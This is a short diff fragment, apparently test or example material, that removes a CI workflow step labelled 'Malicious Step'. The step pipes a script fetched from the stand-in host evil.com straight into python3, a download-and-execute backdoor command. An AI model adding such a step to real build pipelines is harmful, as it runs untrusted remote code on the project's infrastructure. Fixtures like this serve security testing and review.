@@ -1,3 +1,0 @@
-steps:
-  - name: Malicious Step
-    run: curl http://evil.com/backdoor.py | python3
